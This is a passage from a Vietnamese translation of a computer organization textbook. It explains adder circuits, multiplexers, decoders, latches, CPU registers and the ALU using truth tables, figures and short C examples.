<p>+-----------------+-----------------+-----------------+-----------------+
| A               | B               | SUM             | CARRY OUT       |
+=================+=================+=================+=================+
| 0               | 0               | 0               | 0               |
+-----------------+-----------------+-----------------+-----------------+
| 0               | 1               | 1               | 0               |
+-----------------+-----------------+-----------------+-----------------+
| 1               | 0               | 1               | 0               |
+-----------------+-----------------+-----------------+-----------------+
| 1               | 1               | 0               | 1               |
+-----------------+-----------------+-----------------+-----------------+</p>
<p>: Bảng 3. Bảng chân trị cho mạch cộng 1-bit.</p>
<p>Ở bước tiếp theo, với mỗi đầu ra là SUM và CARRY OUT, ta tạo các biểu thức logic cho trường hợp đầu ra bằng 1. Các biểu thức này được biểu diễn dưới dạng phép tuyển (OR) của các phép hội (AND) theo từng dòng của bảng chân trị:</p>
<blockquote>
<p>SUM: (NOT(A) AND B) OR (A AND NOT(B))     # bằng 1 khi chỉ một trong A hoặc B là 1<br />
CARRY OUT: A AND B                        # bằng 1 khi cả A và B đều là 1</p>
</blockquote>
<p>Biểu thức cho CARRY OUT không thể đơn giản hơn. Tuy nhiên, biểu thức cho SUM phức tạp hơn và có thể được đơn giản hóa, dẫn đến thiết kế mạch đơn giản hơn. Điều đầu tiên cần lưu ý là đầu ra SUM cũng có thể được biểu diễn dưới dạng (A XOR B). Nếu ta có cổng XOR hoặc mạch XOR, biểu diễn SUM dưới dạng (A XOR B) sẽ giúp thiết kế mạch cộng đơn giản hơn. Nếu không, ta sử dụng biểu thức với AND, OR và NOT như trên và triển khai bằng các cổng tương ứng.</p>
<p>Giả sử ta có cổng XOR để sử dụng trong việc triển khai mạch cộng 1-bit. Mạch kết quả được hiển thị trong <a href="C5-Arch/arithlogiccircs.html#Fig1bitaddr">Hình 4</a>.</p>
<p><img src="C5-Arch/_images/1bitadder.png" alt="1-bit adder circuit" /></p>
<p><strong>Hình 4. Mạch cộng 1-bit có hai đầu vào là A và B, và hai đầu ra là SUM và CARRY OUT.</strong></p>
<p>Mạch cộng 1-bit có thể được sử dụng như một khối xây dựng cho các mạch phức tạp hơn. Ví dụ, ta có thể muốn tạo các mạch cộng <em>N</em>-bit để thực hiện phép cộng trên các giá trị có kích thước khác nhau (ví dụ: mạch cộng 1-byte, 2-byte hoặc 4-byte). Tuy nhiên, việc tạo mạch cộng <em>N</em>-bit từ <em>N</em> mạch cộng 1-bit đòi hỏi sự cẩn trọng hơn so với việc tạo mạch logic <em>N</em>-bit từ <em>N</em> mạch logic 1-bit.</p>
<p>Khi thực hiện phép cộng nhiều bit (hoặc phép trừ), các bit riêng lẻ được cộng theo thứ tự từ bit ít quan trọng nhất đến bit quan trọng nhất. Trong quá trình cộng từng bit này, nếu tổng của các bit thứ <em>i</em> tạo ra giá trị tràn bằng 1, thì một giá trị 1 bổ sung sẽ được cộng với hai bit thứ <em>(i+1)</em>. Nói cách khác, giá trị tràn của mạch cộng bit thứ <em>i</em> sẽ là đầu vào cho mạch cộng bit thứ <em>(i+1)</em>.</p>
<p>Do đó, để triển khai mạch cộng nhiều bit, ta cần một mạch cộng 1-bit mới có ba đầu vào: A, B và CARRY IN. Để làm điều này, ta thực hiện lại các bước trên để tạo mạch cộng 1-bit, với ba đầu vào (A, B, CARRY IN) và hai đầu ra (SUM và CARRY OUT), bắt đầu với bảng chân trị cho tất cả các tổ hợp đầu vào có thể. Việc thiết kế mạch này được để lại như một bài tập cho người đọc, nhưng ta sẽ hiển thị phiên bản trừu tượng của mạch cộng 1-bit này trong Hình 5.</p>
<p><img src="C5-Arch/_images/1bitaddcin.png" alt="1-bit adder circuit with carry in" /></p>
<p><strong>Hình 5. Mạch cộng 1-bit với ba đầu vào (A, B và CARRY IN) và hai đầu ra (SUM và CARRY OUT).</strong></p>
<p>Sử dụng phiên bản mạch cộng 1-bit này như một khối xây dựng, ta có thể tạo ra mạch cộng <em>N</em>-bit bằng cách đưa các bit toán hạng tương ứng qua từng mạch cộng 1-bit riêng biệt, và truyền giá trị CARRY OUT từ mạch cộng 1-bit thứ <em>i</em> sang đầu vào CARRY IN của mạch cộng 1-bit thứ <em>(i+1)</em>. Mạch cộng 1-bit cho các bit thứ 0 nhận giá trị CARRY IN bằng 0 từ một phần khác trong mạch CPU, nơi thực hiện giải code lệnh ADD.</p>
<p>Loại mạch cộng <em>N</em>-bit được xây dựng từ <em>N</em> mạch cộng 1-bit này được gọi là <strong>ripple carry adder</strong> (&quot;mạch cộng lan truyền&quot;), được minh họa trong Hình 6. Kết quả SUM sẽ <em>lan truyền</em> hoặc được truyền qua mạch từ các bit thấp đến các bit cao. Chỉ sau khi tính toán xong giá trị SUM và CARRY OUT của bit 0 thì giá trị SUM và CARRY OUT của bit 1 mới được tính đúng. Điều này là do CARRY IN của bit thứ 1 nhận giá trị từ CARRY OUT của bit thứ 0, và quá trình này tiếp tục cho các bit cao hơn trong kết quả.</p>
<p><img src="C5-Arch/_images/rippleadder.png" alt="The Ripple adder circuit. The CARRY OUT output from ith bit's ith-bit's adder is the CARRY IN input to the i+1st bit's adder." /></p>
<p><strong>Hình 6. Mạch cộng lan truyền 4-bit được tạo từ bốn mạch cộng 1-bit.</strong></p>
<p>Các mạch cho các phép toán số học và logic khác cũng được xây dựng theo cách tương tự bằng cách kết hợp các mạch và cổng logic. Ví dụ, một mạch trừ để tính (A - B) có thể được xây dựng từ mạch cộng và mạch đảo (negation – &quot;phép phủ định&quot;) bằng cách tính phép trừ dưới dạng (A + (-B)).</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="542-mạch-Điều-khiển"><a class="header" href="#542-mạch-Điều-khiển">5.4.2. Mạch Điều khiển</a></h3>
<p>Mạch điều khiển (control circuits – &quot;mạch điều khiển&quot;) được sử dụng xuyên suốt trong toàn bộ hệ thống. Trên bộ xử lý (processor), chúng điều khiển quá trình thực thi các lệnh chương trình trên dữ liệu chương trình. Chúng cũng kiểm soát việc nạp và lưu giá trị giữa các cấp độ lưu trữ khác nhau (giữa các thanh ghi, bộ nhớ đệm cache và RAM), và điều khiển các thiết bị phần cứng trong hệ thống. Tương tự như mạch số học và logic, các mạch điều khiển thực hiện chức năng phức tạp được xây dựng bằng cách kết hợp các mạch đơn giản hơn và các cổng logic.</p>
<p>Một ví dụ về mạch điều khiển là <strong>multiplexer</strong> (MUX – &quot;bộ chọn&quot;), dùng để lựa chọn một trong nhiều giá trị. CPU có thể sử dụng mạch multiplexer để chọn thanh ghi nào trong CPU sẽ được đọc để lấy giá trị toán hạng của một lệnh.</p>
<p>Một multiplexer <em>N</em>-ngõ vào có một tập hợp gồm <em>N</em> giá trị đầu vào và một đầu ra duy nhất được chọn từ một trong các đầu vào đó. Một đầu vào bổ sung, gọi là <strong>Select</strong> (S – &quot;bit chọn&quot;), code hóa việc chọn đầu vào nào trong số <em>N</em> đầu vào để đưa ra đầu ra.</p>
<p>Multiplexer cơ bản nhất là loại hai ngõ vào, chọn giữa hai đầu vào 1-bit, A và B. Đầu vào chọn của multiplexer hai ngõ vào là một bit duy nhất: nếu đầu vào S là 1, nó sẽ chọn A làm đầu ra; nếu S là 0, nó sẽ chọn B làm đầu ra. Bảng chân trị cho multiplexer 1-bit hai ngõ vào được hiển thị bên dưới. Giá trị của bit chọn (S) quyết định chọn giá trị của A hoặc B làm đầu ra của MUX.</p>
<div class="table-wrapper"><table><thead><tr><th>A</th><th>B</th><th>S</th><th>out</th></tr></thead><tbody>
<tr><td>0</td><td>0</td><td>0</td><td>0 (giá trị của B)</td></tr>
<tr><td>0</td><td>1</td><td>0</td><td>1 (giá trị của B)</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>0 (giá trị của B)</td></tr>
<tr><td>1</td><td>1</td><td>0</td><td>1 (giá trị của B)</td></tr>
<tr><td>0</td><td>0</td><td>1</td><td>0 (giá trị của A)</td></tr>
<tr><td>0</td><td>1</td><td>1</td><td>0 (giá trị của A)</td></tr>
<tr><td>1</td><td>0</td><td>1</td><td>1 (giá trị của A)</td></tr>
<tr><td>1</td><td>1</td><td>1</td><td>1 (giá trị của A)</td></tr>
</tbody></table>
</div>
<p><em>Bảng 1. Bảng chân trị cho multiplexer 1-bit</em></p>
<p>Hình 1 minh họa mạch multiplexer hai ngõ vào cho đầu vào 1-bit.</p>
<p><img src="C5-Arch/_images/1bitmux.png" alt="1 bit mux" /></p>
<p><strong>Hình 1. Mạch multiplexer 1-bit hai ngõ vào.</strong> Giá trị của tín hiệu đầu vào (S) được dùng để chọn một trong hai đầu vào (A hoặc B) làm đầu ra của mạch: khi S là 1, A được chọn; khi S là 0, B được chọn.</p>
<p>Hình 2 minh họa cách multiplexer chọn đầu ra là A khi đầu vào S có giá trị là 1. Ví dụ, giả sử các giá trị đầu vào là: A = 1, B = 0, và S = 1. S được đảo (NOT) trước khi đưa vào cổng AND phía trên cùng với B (0 AND B), cho ra giá trị đầu ra là 0 từ cổng AND phía trên. S được đưa vào cổng AND phía dưới cùng với A, tạo ra (1 AND A), kết quả là giá trị của A được đưa ra từ cổng AND phía dưới. Giá trị của A (1 trong ví dụ này) và 0 từ cổng AND phía trên được đưa vào cổng OR, tạo ra đầu ra là (0 OR A). Nói cách khác, khi S là 1, MUX chọn giá trị của A làm đầu ra (giá trị A là 1 trong ví dụ). Giá trị của B không ảnh hưởng đến đầu ra cuối cùng của MUX, vì đầu ra của cổng AND phía trên luôn là 0 khi S là 1.</p>
<p><img src="C5-Arch/_images/muxA.png" alt="when S is 1, the mux chooses A for its output" /></p>
<p><strong>Hình 2. Mạch multiplexer 1-bit hai ngõ vào chọn (xuất ra) A khi S là 1.</strong></p>
<p>Hình 3 minh họa đường đi qua multiplexer khi đầu vào S có giá trị là 0 và chọn đầu ra là B. Nếu ta giữ nguyên giá trị đầu vào của A và B như ví dụ trên, nhưng thay đổi S thành 0, thì phép đảo của 0 được đưa vào cổng AND phía trên, tạo ra (1 AND B), tức là giá trị của B được đưa ra từ cổng AND phía trên. Đầu vào của cổng AND phía dưới là (0 AND A), cho ra 0 từ cổng AND phía dưới. Do đó, đầu vào của cổng OR là (B OR 0), kết quả là giá trị của B được chọn làm đầu ra của MUX (giá trị B là 0 trong ví dụ).</p>
<p><img src="C5-Arch/_images/muxB.png" alt="when S is 0, the mux chooses B for its output" /></p>
<p><strong>Hình 3. Mạch multiplexer 1-bit hai ngõ vào chọn (xuất ra) B khi S là 0.</strong></p>
<p>Mạch multiplexer 1-bit hai ngõ vào là một khối xây dựng để tạo ra các mạch multiplexer <em>N</em>-bit hai ngõ vào. Ví dụ, Hình 4 minh họa một mạch multiplexer 4-bit hai ngõ vào được xây dựng từ bốn mạch multiplexer 1-bit hai ngõ vào.</p>
<p><img src="C5-Arch/_images/4bitmux.png" alt="4 bit 2way-mux" /></p>
<p><strong>Hình 4. Mạch multiplexer 4-bit hai ngõ vào được xây dựng từ bốn mạch multiplexer 1-bit hai ngõ vào.</strong> Một bit tín hiệu duy nhất, S, được dùng để chọn A hoặc B làm đầu ra.</p>
<p>Một multiplexer <em>N</em>-ngõ vào sẽ chọn một trong <em>N</em> đầu vào làm đầu ra. Nó yêu cầu một thiết kế mạch MUX hơi khác so với loại hai ngõ vào, và cần log₂(<em>N</em>) bit cho đầu vào Select. Các bit chọn bổ sung này là cần thiết vì với log₂(<em>N</em>) bit, ta có thể code hóa <em>N</em> giá trị khác nhau, mỗi giá trị tương ứng với một lựa chọn trong số <em>N</em> đầu vào. Mỗi tổ hợp khác biệt của các bit Select log₂(<em>N</em>) được đưa vào cùng với một trong các giá trị đầu vào <em>N</em> vào một cổng AND, kết quả là đúng một giá trị đầu vào được chọn làm đầu ra của MUX. Hình 5 minh họa một ví dụ về mạch multiplexer 1-bit bốn ngõ vào.</p>
<p><img src="C5-Arch/_images/nwaymux.png" alt="N-way mux" /></p>
<p><strong>Hình 5. Mạch multiplexer bốn ngõ vào có bốn đầu vào và hai bit chọn (log₂(4)) dùng để code hóa đầu vào nào trong số bốn đầu vào sẽ được chọn làm đầu ra.</strong></p>
<p>Mạch multiplexer bốn ngõ vào sử dụng bốn cổng AND ba ngõ vào và một cổng OR bốn ngõ vào. Các phiên bản cổng nhiều ngõ vào có thể được xây dựng bằng cách nối chuỗi nhiều cổng AND (hoặc OR) hai ngõ vào. Ví dụ, một cổng AND ba ngõ vào được xây dựng từ hai cổng AND hai ngõ vào: cổng AND đầu tiên nhận hai giá trị đầu vào, và cổng AND thứ hai nhận giá trị đầu vào thứ ba cùng với đầu ra từ cổng AND đầu tiên. Biểu thức (x AND y AND z) tương đương với ((x AND y) AND z).</p>
<p>Để hiểu cách mạch multiplexer bốn ngõ vào hoạt động, hãy xét trường hợp đầu vào S có giá trị là 2 (0b10 trong hệ nhị phân), như minh họa trong Hình 6. Cổng AND phía trên nhận đầu vào là (NOT(S₀) AND NOT(S₁) AND A), tức là (1 AND 0 AND A), cho ra đầu ra là 0. Cổng AND thứ hai nhận đầu vào là (0 AND 0 AND B), cho ra 0. Cổng AND thứ ba nhận đầu vào là (1 AND 1 AND C), cho ra giá trị của C. Cổng AND cuối cùng nhận đầu vào là (0 AND 1 AND D), cho ra 0. Cổng OR nhận các đầu vào là (0 OR 0 OR C OR 0), kết quả là giá trị của C được chọn làm đầu ra của MUX (giá trị S bằng 2 chọn C).</p>
<p><img src="C5-Arch/_images/4waychooseC.png" alt="4-way mux circuit selects C as output when S is 2 (0b10)" /></p>
<p><strong>Hình 6. Mạch multiplexer bốn ngõ vào chọn C làm đầu ra khi đầu vào Select, S, là 2 (0b10).</strong></p>
<p><strong>Demultiplexer</strong> và <strong>decoder</strong> là hai ví dụ khác về mạch điều khiển.</p>
<p>Một <strong>demultiplexer</strong> (DMUX – &quot;bộ phân phối&quot;) là nghịch đảo của multiplexer. Trong khi multiplexer chọn một trong <em>N</em> đầu vào, thì demultiplexer chọn một trong <em>N</em> đầu ra. Một DMUX nhận một giá trị đầu vào duy nhất và một đầu vào chọn, và có <em>N</em> đầu ra. Dựa vào giá trị của S, nó gửi giá trị đầu vào đến đúng một trong số <em>N</em> đầu ra (giá trị đầu vào được định tuyến đến một trong <em>N</em> đường đầu ra). Mạch DMUX thường được dùng để chọn một trong <em>N</em> mạch để truyền giá trị.</p>
<p>Một mạch <strong>decoder</strong> nhận một đầu vào đã được code hóa và kích hoạt một trong nhiều đầu ra dựa trên giá trị đầu vào. Ví dụ, một mạch decoder có đầu vào <em>N</em>-bit sẽ sử dụng giá trị đó để kích hoạt (đặt bằng 1) đúng một trong số các đường đầu ra 2^N^ (đường tương ứng với code hóa của giá trị <em>N</em>-bit).</p>
<p><a href="C5-Arch/controlcircs.html#dmux">Hình 7</a> minh họa một ví dụ về mạch demultiplexer 1-bit hai ngõ ra, trong đó giá trị đầu vào chọn (s) quyết định đầu ra nào trong hai đầu ra sẽ nhận giá trị đầu vào A. Hình cũng minh họa một ví dụ về mạch decoder 2-bit, trong đó các bit đầu vào xác định đầu ra nào trong bốn đầu ra sẽ được đặt bằng 1. Bảng chân trị của cả hai mạch cũng được hiển thị.</p>
<p><img src="C5-Arch/_images/dmuxdecoder.png" alt="2-way 1-bit dmux and 2-bit Decodercircuit" /></p>
<p><strong>Hình 7. Mạch demultiplexer 1-bit hai ngõ ra, và mạch decoder 2-bit, cùng với bảng chân trị của chúng.</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="543-mạch-lưu-trữ-storage-circuits"><a class="header" href="#543-mạch-lưu-trữ-storage-circuits">5.4.3. Mạch lưu trữ (Storage Circuits)</a></h3>
<p><strong>Storage circuits</strong> (mạch lưu trữ) được sử dụng để xây dựng bộ nhớ máy tính nhằm lưu trữ các giá trị nhị phân. Loại bộ nhớ máy tính được xây dựng từ các mạch lưu trữ này được gọi là <strong>static RAM</strong> (SRAM – &quot;RAM tĩnh&quot;). SRAM được dùng để xây dựng bộ lưu trữ thanh ghi của CPU và bộ nhớ đệm (cache) trên chip. Các hệ thống thường sử dụng <strong>dynamic RAM</strong> (DRAM – &quot;RAM động&quot;) cho bộ nhớ chính (RAM). Thiết kế dựa trên tụ điện của DRAM yêu cầu phải được làm mới định kỳ với giá trị mà nó lưu trữ, do đó có tên gọi “động”. SRAM là bộ lưu trữ dựa trên mạch, không cần làm mới giá trị, vì vậy được gọi là RAM tĩnh. Bộ nhớ dựa trên mạch nhanh hơn nhưng đắt hơn bộ nhớ dựa trên tụ điện. Do đó, SRAM thường được sử dụng cho các tầng cao trong <a href="C5-Arch/../C11-MemHierarchy/mem_hierarchy.html#_the_memory_hierarchy">hệ phân cấp bộ nhớ</a> (các thanh ghi CPU và bộ nhớ đệm trên chip), còn DRAM được dùng cho bộ nhớ chính (RAM). Trong chương này, ta sẽ tập trung vào bộ nhớ dựa trên mạch như SRAM.</p>
<p>Để lưu trữ một giá trị, mạch phải có vòng phản hồi (feedback loop) để giữ lại giá trị đó. Nói cách khác, giá trị của mạch lưu trữ phụ thuộc vào các giá trị đầu vào và cả giá trị hiện đang được lưu trữ. Khi mạch lưu trữ một giá trị, giá trị hiện tại và các đầu vào của nó cùng tạo ra đầu ra khớp với giá trị đang lưu (tức là mạch tiếp tục lưu cùng một giá trị). Khi một giá trị mới được ghi vào mạch lưu trữ, các đầu vào của mạch sẽ thay đổi tạm thời để điều chỉnh hành vi của mạch, dẫn đến việc ghi và lưu trữ giá trị mới. Sau khi ghi xong, mạch sẽ trở lại trạng thái ổn định để lưu giá trị mới cho đến khi có lần ghi tiếp theo.</p>
<h4 id="rs-latch"><a class="header" href="#rs-latch">RS Latch</a></h4>
<p>Một latch là một mạch số dùng để lưu trữ (hoặc ghi nhớ) một giá trị 1-bit. Một ví dụ là <strong>reset-set latch</strong> (RS latch – &quot;mạch chốt đặt–xóa&quot;). RS latch có hai đầu vào, S và R, và một đầu ra Q, cũng chính là giá trị được lưu trong latch. RS latch cũng có thể xuất ra NOT(Q), tức là phủ định của giá trị đang lưu. Hình 1 minh họa một mạch RS latch dùng để lưu trữ một bit.</p>
<p><img src="C5-Arch/_images/rslatch.png" alt="an RS Latch for storing 1-bit" /></p>
<p><strong>Hình 1. Mạch RS latch lưu trữ một giá trị 1-bit.</strong></p>
<p>Điểm đầu tiên cần lưu ý về RS latch là vòng phản hồi từ đầu ra về đầu vào: đầu ra của cổng NAND phía trên (Q) là đầu vào (a) của cổng NAND phía dưới, và đầu ra của cổng NAND phía dưới (~Q) là đầu vào (b) của cổng NAND phía trên. Khi cả hai đầu vào S và R đều bằng 1, RS latch sẽ lưu giá trị Q. Nói cách khác, khi S và R đều bằng 1, giá trị đầu ra Q của RS latch sẽ ổn định. Để thấy rõ hành vi này, hãy xem Hình 2; hình này minh họa một RS latch đang lưu giá trị 1 (Q = 1). Khi R và S đều bằng 1, giá trị phản hồi đầu vào (a) của cổng NAND phía dưới là giá trị Q, tức là 1, nên đầu ra của cổng NAND phía dưới là 0 (1 NAND 1 = 0). Giá trị phản hồi đầu vào (b) của cổng NAND phía trên là đầu ra của cổng NAND phía dưới, tức là 0. Đầu vào còn lại của cổng NAND phía trên là 1, tức là giá trị của S. Đầu ra của cổng phía trên là 1 (1 NAND 0 = 1). Do đó, khi S và R đều bằng 1, mạch này liên tục lưu giá trị Q (trong ví dụ này là 1).</p>
<p><img src="C5-Arch/_images/latchstores1.png" alt="An RS Latch that stores the value 1" /></p>
<p><strong>Hình 2. Một RS latch lưu trữ giá trị 1-bit.</strong><br />
R và S đều bằng 1 khi latch lưu một giá trị. Giá trị được lưu sẽ xuất ra tại Q.</p>
<p>Để thay đổi giá trị được lưu trong RS latch, ta đặt đúng một trong hai đầu vào R hoặc S bằng 0. Khi latch lưu giá trị mới, R và S sẽ được đặt lại về 1. Mạch điều khiển bao quanh RS latch đảm bảo rằng R và S không bao giờ đồng thời bằng 0: tối đa chỉ một trong hai có giá trị 0, và việc một trong hai đầu vào bằng 0 nghĩa là đang ghi một giá trị mới vào RS latch. Để lưu giá trị 0 vào RS latch, ta đặt đầu vào R bằng 0 (giá trị của S giữ nguyên bằng 1). Để lưu giá trị 1, ta đặt đầu vào S bằng 0 (giá trị của R giữ nguyên bằng 1).</p>
<p>Ví dụ, giả sử RS latch hiện đang lưu giá trị 1. Để ghi giá trị 0 vào latch, ta đặt R bằng 0. Điều này có nghĩa là các giá trị 0 và 1 được đưa vào cổng NAND phía dưới, tính toán (0 NAND 1) cho kết quả là 1. Giá trị đầu ra này (1) cũng là đầu vào b của cổng NAND phía trên (xem Hình 3B). Với đầu vào b mới là 1 và đầu vào S là 1, cổng NAND phía trên tính toán đầu ra mới là 0 cho Q, giá trị này cũng được đưa làm đầu vào a cho cổng NAND phía dưới (xem <a href="C5-Arch/storagecircs.html#Figwrite0">Hình 3</a>C). Với a = 0 và b = 1, latch giờ lưu giá trị 0. Khi R được đặt lại bằng 1, RS latch tiếp tục lưu giá trị 0 (xem Hình 3D).</p>
<p><img src="C5-Arch/_images/latchwrite0.png" alt="Set R to 0 to write 0 into the RS Latch" /></p>
<p><strong>Hình 3. Để ghi giá trị 0 vào RS latch, tạm thời đặt R bằng 0.</strong></p>
<h4 id="gated-d-latch"><a class="header" href="#gated-d-latch">Gated D Latch</a></h4>
<p><strong>Gated D latch</strong> là một phiên bản mở rộng của RS latch, bổ sung mạch điều khiển để đảm bảo rằng R và S không bao giờ đồng thời nhận giá trị 0. <a href="C5-Arch/storagecircs.html#FiggatedD">Hình 4</a> minh họa cấu trúc của một gated D latch.</p>
<p><img src="C5-Arch/_images/gatedD.png" alt="Gated D latch combines an RS latch with added write control circuitry" /></p>
<p><strong>Hình 4. Gated D latch lưu trữ một giá trị 1-bit.</strong><br />
Cặp cổng NAND đầu tiên điều khiển việc ghi vào RS latch và đảm bảo rằng R và S không bao giờ đồng thời bằng 0.</p>
<p>Đầu vào dữ liệu (D) của gated D latch là giá trị cần lưu vào mạch (0 hoặc 1). Đầu vào Write Enable (WE) điều khiển việc ghi giá trị vào RS latch. Khi WE = 0, đầu ra của cả hai cổng NAND đều là 1, dẫn đến đầu vào S và R của RS latch đều bằng 1 (RS latch giữ nguyên giá trị đang lưu). Gated D latch chỉ ghi giá trị D vào RS latch khi WE = 1.</p>
<p>Vì giá trị D được đảo trước khi đưa vào cổng NAND phía dưới, nên chỉ một trong hai cổng NAND (trên hoặc dưới) có đầu vào là 1. Điều này đảm bảo rằng khi WE = 1, chính xác một trong hai đầu vào R hoặc S sẽ bằng 0. Ví dụ, khi D = 1 và WE = 1, cổng NAND phía trên tính (1 NAND 1), cổng phía dưới tính (0 NAND 1). Kết quả là đầu vào S từ cổng NAND phía trên bằng 0, đầu vào R từ cổng NAND phía dưới bằng 1 — tức là ghi giá trị 1 vào RS latch.</p>
<p>Khi WE = 0, cả hai cổng NAND đều xuất ra 1, giữ R và S ở mức 1. Nói cách khác, khi WE = 0, giá trị D không ảnh hưởng đến giá trị đang lưu trong RS latch; chỉ khi WE = 1 thì giá trị D mới được ghi vào latch. Để ghi một giá trị khác vào gated D latch, ta đặt D bằng giá trị cần lưu và WE bằng 1.</p>
<h4 id="cpu-register"><a class="header" href="#cpu-register">CPU Register</a></h4>
<p>Mạch lưu trữ nhiều bit được xây dựng bằng cách liên kết nhiều mạch lưu trữ 1-bit lại với nhau. Ví dụ, kết hợp 32 latch D 1-bit sẽ tạo thành một mạch lưu trữ 32-bit, có thể dùng làm thanh ghi CPU 32-bit như minh họa trong Hình 5.</p>
<p>Mạch thanh ghi có hai đầu vào: một giá trị dữ liệu 32-bit và một tín hiệu Write Enable 1-bit. Bên trong, mỗi latch D 1-bit nhận một bit từ đầu vào <em>Data in</em> 32-bit của thanh ghi làm đầu vào D, và nhận tín hiệu WE của thanh ghi làm đầu vào WE. Đầu ra của thanh ghi là giá trị 32-bit được lưu trong 32 latch D 1-bit cấu thành mạch thanh ghi.</p>
<p><img src="C5-Arch/_images/register.png" alt="A 32-bit CPU Register built from 32 1-bit Gated D latches" /></p>
<p><strong>Hình 5. Một thanh ghi CPU được xây dựng từ nhiều gated D latch (32 latch cho thanh ghi 32-bit).</strong><br />
Khi đầu vào WE bằng 1, dữ liệu đầu vào sẽ được ghi vào thanh ghi. Đầu ra dữ liệu là giá trị đang được lưu.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="55-xây-dựng-bộ-xử-lý-tổng-hợp-tất-cả-thành-phần"><a class="header" href="#55-xây-dựng-bộ-xử-lý-tổng-hợp-tất-cả-thành-phần">5.5. Xây dựng Bộ xử lý: Tổng hợp tất cả thành phần</a></h2>
<p><strong>Central processing unit</strong> (CPU – &quot;bộ xử lý trung tâm&quot;) triển khai các đơn vị xử lý và điều khiển trong kiến trúc von Neumann – là các phần đảm nhiệm việc thực thi các lệnh chương trình trên dữ liệu chương trình (xem <a href="C5-Arch/cpu.html#FigCPUVonNeumann">Hình 1</a>).</p>
<p><img src="C5-Arch/_images/vonneumann.png" alt="von Neumann architecture is the 5 units connected by buses" /></p>
<p><strong>Hình 1. CPU triển khai các phần xử lý và điều khiển trong kiến trúc von Neumann.</strong></p>
<p>CPU được xây dựng từ các khối mạch cơ bản: mạch số học/logic, mạch lưu trữ và mạch điều khiển. Các thành phần chức năng chính của nó gồm:</p>
<ul>
<li><strong>Arithmetic logic unit</strong> (ALU – &quot;bộ số học và logic&quot;) thực hiện các phép toán số học và logic;</li>
<li>Một tập hợp các <strong>registers</strong> (thanh ghi) đa dụng để lưu trữ dữ liệu chương trình;</li>
<li>Một số mạch điều khiển và thanh ghi chuyên dụng dùng trong quá trình thực thi lệnh;</li>
<li>Và một <strong>clock</strong> (xung nhịp) điều khiển hoạt động của mạch CPU để thực thi các lệnh chương trình.</li>
</ul>
<p>Trong phần này, ta sẽ trình bày các thành phần chính của CPU, bao gồm ALU và tập thanh ghi, và cách chúng được kết hợp để tạo thành một CPU. Trong phần tiếp theo, ta sẽ tìm hiểu cách CPU thực thi các lệnh chương trình và cách xung nhịp được sử dụng để điều khiển quá trình thực thi.</p>
<h3 id="551-alu"><a class="header" href="#551-alu">5.5.1. ALU</a></h3>
<p>ALU là một mạch phức tạp thực hiện tất cả các phép toán số học và logic trên số nguyên có dấu và không dấu. Một đơn vị riêng biệt gọi là floating-point unit (đơn vị số thực dấu chấm động) thực hiện các phép toán trên giá trị dấu chấm động. ALU nhận các toán hạng kiểu số nguyên và một giá trị <strong>opcode</strong> (code lệnh – &quot;code thao tác&quot;) xác định phép toán cần thực hiện (ví dụ: phép cộng). ALU xuất ra giá trị kết quả của phép toán được chỉ định trên các đầu vào toán hạng, cùng với các giá trị <strong>condition code</strong> (code điều kiện – &quot;code trạng thái&quot;) code hóa thông tin về kết quả của phép toán. Các code điều kiện phổ biến cho biết liệu kết quả của ALU có âm, bằng 0 hay có bit tràn (carry-out) hay không.</p>
<p>Ví dụ, với câu lệnh C sau:</p>
<pre><code class="language-c">x = 6 + 8;
</code></pre>
<p>CPU bắt đầu thực hiện phép cộng bằng cách đưa các giá trị toán hạng (6 và 8) cùng với các bit code hóa phép cộng ADD vào mạch ALU. ALU tính toán kết quả và xuất ra giá trị đó cùng với các code điều kiện để chỉ ra rằng kết quả là không âm, khác 0 và không gây tràn. Mỗi code điều kiện được code hóa bằng một bit. Bit có giá trị 1 nghĩa là điều kiện đúng, còn bit có giá trị 0 nghĩa là điều kiện không đúng với kết quả của ALU. Trong ví dụ này, mẫu bit 000 biểu thị ba điều kiện liên quan đến phép cộng 6 + 8: kết quả không âm (0), không bằng 0 (0), và không có tràn (0).</p>
<p>Các code điều kiện do ALU thiết lập trong quá trình thực hiện phép toán đôi khi được các lệnh tiếp theo sử dụng để quyết định hành động dựa trên một điều kiện cụ thể. Ví dụ, lệnh ADD có thể tính phần <code>(x + 8)</code> trong câu lệnh <code>if</code> sau:</p>
<pre><code class="language-c">if( (x + 8) != 0 ) {
    x++;
}
</code></pre>
<p>Việc thực thi lệnh ADD bởi ALU sẽ thiết lập các code điều kiện dựa trên kết quả của phép cộng <code>(x + 8)</code>. Một lệnh nhảy có điều kiện (conditional jump) được thực thi sau lệnh ADD sẽ kiểm tra các bit code điều kiện do lệnh ADD thiết lập và sẽ nhảy (bỏ qua việc thực thi các lệnh trong thân <code>if</code>) hoặc không, tùy theo giá trị của các bit đó. Ví dụ, nếu lệnh ADD thiết lập code điều kiện zero bằng 0, lệnh nhảy có điều kiện sẽ không bỏ qua các lệnh trong thân <code>if</code> (0 nghĩa là kết quả của phép cộng không bằng 0). Nếu code điều kiện zero là 1, nó sẽ nhảy qua các lệnh trong thân <code>if</code>. Để thực hiện việc nhảy qua một tập hợp lệnh, CPU sẽ ghi địa chỉ bộ nhớ của lệnh đầu tiên sau thân <code>if</code> vào <strong>program counter</strong> (PC – &quot;bộ đếm chương trình&quot;), là thanh ghi chứa địa chỉ của lệnh tiếp theo cần thực thi.</p>
<p>Một mạch ALU kết hợp nhiều mạch số học và logic (để thực hiện tập hợp các phép toán của nó) với một mạch multiplexer để chọn đầu ra của ALU. Thay vì chỉ kích hoạt mạch số học tương ứng với phép toán cụ thể, một ALU đơn giản sẽ gửi các giá trị đầu vào toán hạng đến tất cả các mạch số học và logic bên trong. Đầu ra từ tất cả các mạch số học và logic bên trong ALU được đưa vào mạch multiplexer, mạch này sẽ chọn đầu ra của ALU. Đầu vào opcode được dùng làm tín hiệu điều khiển cho multiplexer để chọn phép toán số học/logic nào sẽ được chọn làm đầu ra của ALU. Đầu ra code điều kiện được xác định dựa trên đầu ra của multiplexer kết hợp với mạch kiểm tra giá trị đầu ra để xác định từng bit code điều kiện.</p>
